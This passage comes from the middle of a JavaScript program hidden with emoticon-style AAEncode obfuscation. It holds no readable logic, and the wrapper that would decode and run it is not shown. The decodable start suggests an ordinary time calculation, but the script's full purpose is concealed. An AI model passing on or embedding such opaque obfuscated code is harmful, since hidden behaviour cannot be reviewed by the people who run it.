ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) - ﾟΘﾟ) + ﾟｰﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + (ﾟｰﾟ + ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (ﾟｰﾟ + ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + ((o ^ _ ^ o) - ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + ((o ^ _ ^ o) - ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + (o ^ _ ^ o)) + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) - ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ((o ^ _ ^ o) - ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + (o ^ _ ^ o)) + (ﾟｰﾟ + ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + (o ^ _ ^ o)) + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) - ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + (ﾟｰﾟ + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ((o ^ _ ^ o) - ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ((o ^ _ ^ o) - ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + (o ^ _ ^ o)) + (ﾟｰﾟ + ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + (o ^ _ ^ o)) + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + (o ^ _ ^ o)) + ﾟｰﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ((o ^ _ ^ o) - ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + (o ^ _ ^ o)) + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + (o ^ _ ^ o)) + (ﾟｰﾟ + ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟｰﾟ + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) - ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + (o ^ _ ^ o)) + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) - ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + (o ^ _ ^ o)) + (ﾟｰﾟ + ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ((o ^ _ ^ o) - ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟΘﾟ + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟｰﾟ + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (ﾟｰﾟ + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + ﾟｰﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + (ﾟｰﾟ + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (ﾟｰﾟ + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + (o ^ _ ^ o)) + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (ﾟｰﾟ + ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + ((o ^ _ ^ o) - ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟｰﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ((o ^ _ ^ o) - ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + ﾟｰﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟｰﾟ + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + ﾟｰﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + (o ^ _ ^ o)) + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) - ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + (o ^ _ ^ o)) + (ﾟｰﾟ + ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) - ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + ﾟｰﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + (ﾟｰﾟ + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (ﾟｰﾟ + ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + (ﾟｰﾟ + ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟｰﾟ + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + (ﾟｰﾟ + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + (ﾟｰﾟ + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + (o ^ _ ^ o)) + (ﾟｰﾟ + ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + ((o ^ _ ^ o) - ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ((o ^ _ ^ o) - ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + (o ^ _ ^ o)) + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + (o ^ _ ^ o)) + (ﾟｰﾟ + ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + ((o ^ _ ^ o) - ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + ((o ^ _ ^ o) - ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + (o ^ _ ^ o)) + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + (o ^ _ ^ o)) + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ((o ^ _ ^ o) - ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + (o ^ _ ^ o)) + (ﾟｰﾟ + ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + ((o ^ _ ^ o) - ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + ﾟｰﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟｰﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟｰﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + (ﾟｰﾟ + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (c ^ _ ^ o) + (ﾟｰﾟ + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) - ﾟΘﾟ) + ﾟｰﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) - ﾟΘﾟ) + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟｰﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ((o ^ _ ^ o) - ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + (ﾟｰﾟ + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + (o ^ _ ^ o)) + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) - ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + 